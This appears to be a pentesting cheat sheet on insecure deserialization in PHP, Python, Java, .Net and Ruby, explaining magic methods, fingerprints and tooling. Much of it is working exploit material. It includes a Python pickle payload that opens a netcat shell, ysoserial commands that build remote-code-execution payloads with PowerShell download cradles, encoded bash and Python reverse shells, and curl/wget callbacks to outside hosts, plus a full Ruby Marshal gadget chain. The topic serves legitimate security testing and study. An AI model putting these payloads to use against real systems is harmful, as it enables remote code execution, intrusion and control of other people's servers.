**Serialization** is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications.

**Deserialization** is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.

In many occasions you can find some code in the server side that unserialize some object given by the user.\
In this case, you can send a malicious payload to make the server side behave unexpectedly.


#### Docs & Refs
[https://book.hacktricks.xyz/pentesting-web/deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)  
[https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html) 




## PHP

[https://notsosecure.com/remote-code-execution-via-php-unserialize/](https://notsosecure.com/remote-code-execution-via-php-unserialize/)

Funzioni Magiche PHP: [http://www.programmerinterview.com/php-questions/php-what-are-magic-functions/](http://www.programmerinterview.com/php-questions/php-what-are-magic-functions/)



Magic method used with serialization:

* `__sleep` is called when an object is serialized and must be returned to array

Magic method used with deserialization

* `__wakeup` is called when an object is deserialized.
* `__destruct` is called when PHP script end and object is destroyed.
* `__toString` uses object as string but also can be used to read file or more than that based on function call inside it.

```php
<?php
class test {
    public $s = "This is a test";
    public function displaystring(){
        echo $this->s.'<br />';
    }
    public function __toString()
    {
        echo '__toString method called';
    }
    public function __construct(){
        echo "__construct method called";
    }
    public function __destruct(){
        echo "__destruct method called";
    }
    public function __wakeup(){
        echo "__wakeup method called";
    }
    public function __sleep(){
        echo "__sleep method called";
        return array("s"); #The "s" makes references to the public attribute
    }
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called__destruct method called
php > $o->displaystring();
This is a test<br />
php > $ser=serialize($o);
__sleep method called
php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}
php > $unser=unserialize($ser);
__wakeup method called__destruct method called
php > $unser->displaystring();
This is a test<br />
*/
?>
```

If you look to the results you can see that the functions `__wakeup` and `__destruct` are called when the object is deserialized. Note that in several tutorials you will find that the `__toString` function is called when trying yo print some attribute, but apparently that's **not happening anymore**.

[**Autoload Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) may also be **dangerous**.

You can read an explained **PHP example here**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), here [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) or here [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)


#### PHPGGC (ysoserial for PHP)

[**PHPGCC**](https://github.com/ambionics/phpggc) can help you generating payloads to abuse PHP deserializations.\
Note than in several cases you **won't be able to find a way to abuse a deserialization in the source code** of the application but you may be able to **abuse the code of external PHP extensions.**\
So, if you can, check the `phpinfo()` of the server and **search on the internet** (an even on the **gadgets** of **PHPGCC**) some possible gadget you could abuse.


## Python

### **Pickle**

When the object gets unpickle, the function _\_\_reduce\_\__ will be executed.\
When exploited, server could return an error.

```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```

For more information about escaping from **pickle jails** check the relative article.


## NodeJS

#### `__proto__` and `prototype` pollution

If you want to learn about this technique **take a look to the  tutorial on hacktricks.com**:



## Java - HTTP

The main problem with deserialized objects in Java is that **deserialization callbacks were invoked during deserialization**. This makes possible for an **attacker** to **take advantage of that callbacks** and prepare a payload that abuses the callbacks to **perform malicious actions**.

#### Fingerprints

**White Box**
Search inside the code for serialization classes and function. For example, search for classes implementing `Serializable` , the use of `java.io.ObjectInputStream` __ or `readObject` __ or `readUnshare` functions_._

You should also keep an eye on:

* `XMLdecoder` with external user defined parameters
* `XStream` with `fromXML` method (xstream version <= v1.46 is vulnerable to the serialization issue)
* `ObjectInputStream` with `readObject`
* Uses of `readObject`, `readObjectNodData`, `readResolve` or `readExternal`
* `ObjectInputStream.readUnshared`
* `Serializable`

**Black Box**
Fingerprints/Magic Bytes of **java serialised** objects (from `ObjectInputStream`):

* `AC ED 00 05` in Hex
* `rO0` in Base64
* `Content-type` header of an HTTP response set to `application/x-java-serialized-object`
* `1F 8B 08 00`  Hex previously compressed
* `H4sIA` Base64 previously compressed
* Web files with extension `.faces` and `faces.ViewState` parameter. If you find this in a wabapp, take a look to the **post about Java JSF VewState Deserialization**

```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```

#### Check if vulnerable

If you want to **learn about how does a Java Deserialized exploit work** you should take a look to **Basic Java Deserialization**, **Java DNS Deserialization**, **CommonsCollection1 Payload**.

**White Box Test**
You can check if there is installed any application with known vulnerabilities.

```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```

You could try to **check all the libraries** known to be vulnerable and that [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Or you could check the libraries indicated on [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
You could also use [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) to search for possible gadget chains that can be exploited.\
When running **gadgetinspector** (after building it) don't care about the tons of warnings/errors that it's going through and let it finish. It will write all the findings under _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Please, notice that **gadgetinspector won't create an exploit and it may indicate false positives**.

**Black Box Test**
Using the Burp extension **gadgetprobe** you can identify **which libraries are available** (and even the versions). With this information it could be **easier to choose a payload** to exploit the vulnerability.

Using Burp extension [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) you can **identify vulnerable libraries** exploitable with ysoserial and **exploit** them.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) \
Java Deserialization Scanner is focused on **`ObjectInputStream`** deserializations.

You can also use [**Freddy**](https://github.com/nccgroup/freddy) to **detect deserializations** vulnerabilities in **Burp**. This plugin will detect **not only `ObjectInputStream`**related vulnerabilities but **also** vulns from **Json** an **Yml** deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)


#### **Exploit**

**ysoserial**

The most well-known tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using **ysoseral-modified** which will allow you to use complex commands (with pipes for example).\
Note that this tool is **focused** on exploiting **`ObjectInputStream`**.\
I would **start using the "URLDNS"** payload **before a RCE** payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.

```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
## Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
## Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
## Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
## DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
## HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
### In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
### To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
## Reverse Shell
### Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
## Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload 
## Time
### Using time in bash I didn't notice any difference in the timing of the response
## Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
## DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
## HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
## Reverse shell
### Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
### Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```

When creating a payload for **java.lang.Runtime.exec()** you **cannot use special characters** like ">" or "|" to redirect the output of an execution, "$()" to execute commands or even **pass arguments** to a command separated by **spaces** (you can do `echo -n "hello world"` but you can't do `python2 -c 'print "Hello world"'`). In order to encode correctly the payload you could [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).


**serialkillerbypassgadgets**

You can **use** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **along with ysoserial to create more exploits**. More information about this tool in the **slides of the talk** where the tool was presented: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

**marshalsec**

[**marshalsec** ](https://github.com/mbechler/marshalsec)can be used to generate payloads to exploit different **Json** and **Yml** serialization libraries in Java.


**FastJSON**

Read more about this Java JSON library: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

#### **Labs**

* If you want to test some ysoserial payloads you can **run this webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

###### Why

Java LOVES sending serialized objects all over the place. For example:

* In **HTTP requests** – Parameters, ViewState, Cookies, you name it.
* **RMI** – The extensively used Java RMI protocol is 100% based on serialization
* **RMI over HTTP** – Many Java thick client web apps use this – again 100% serialized objects
* **JMX** – Again, relies on serialized objects being shot over the wire
* **Custom Protocols** – Sending an receiving raw Java objects is the norm – which we’ll see in some of the exploits to come




## .Net

.Net is similar to Java regarding how deserialization exploits work: The **exploit** will **abuse gadgets** that **execute** some interesting **code when** an object is **deserialized**.

### Fingerprint

#### WhiteBox

Search the source code for the following terms:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Look for any serializers where the type is set by a user controlled variable.

#### BlackBox

You can search for the Base64 encoded string **AAEAAAD/////** or any other thing that **may be deserialized** in the back-end and that allows you to control the deserialized type**.** For example, a **JSON** or **XML** containing `TypeObject` or `$type`.

### ysoserial.net

In this case you can use the tool [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) in order to **create the deserialization exploits**. Once downloaded the git repository you should **compile the tool** using Visual Studio for example.


## **Ruby**

Ruby has two methods to implement serialization inside the **marshal** library: first method is **dump** that converts object into bytes streams **(serialize)**. And the second method is **load** to convert bytes stream to object again (**deserialize**).\
Ruby uses HMAC to sign the serialized object and saves the key on one of the following files:

* config/environment.rb
* config/initializers/secret\_token.rb
* config/secrets.yml
* /proc/self/environ

Ruby 2.X generic deserialization to RCE gadget chain (more info in [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)):

```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```

Other RCE chain to exploit Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)